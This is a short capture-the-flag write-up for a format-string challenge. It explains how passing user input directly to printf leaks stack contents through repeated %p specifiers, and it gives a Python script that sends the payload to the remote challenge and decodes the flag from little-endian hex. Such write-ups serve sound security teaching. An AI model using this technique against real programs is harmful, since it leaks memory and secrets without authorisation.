# format string 1
This is similar to the previous format string challenge, where we are leveraging string formatting bugs in order to exploit the program to give us the flag.

In this case we are exploiting the fact that the user provided text is being put into `printf` directly with no sanity checks. These 2 lines:

```
scanf("%1024s", buf);
printf(buf);
``` 

Because `printf` has the header `int printf(const char *fmt, ...);` C will just pass whatever is after into the function without checking.

We use this and provide a string that will simply return whatever is on the stack depending on what we use as input.
On a 64 bit system, inputting 5x `%p` into the buf will give us `rsi, rdx, rcx, r8, r9`. One extra `%p` will then give us whatever is after those on the stack.

Hence, giving a string like: `s = "%p," * 18 + "\n"` as argument will give us 13 positions in the stack after r9.

Then its just a matter of finding where the flag is located and doing some little endian shenanigans in order to get the flag:

```
conn = remote(host, port)

print(conn.recvline())

conn.send(s)

s = conn.recvuntil("Bye!")

s = s.decode("utf-8").split(",\nBye!")[0]

s = s.split(",")[-5:]

out = ""
for i in s:
    out += bytearray.fromhex(i.split("0x")[1]).decode()[::-1]

print("flag:", out)

conn.close()
```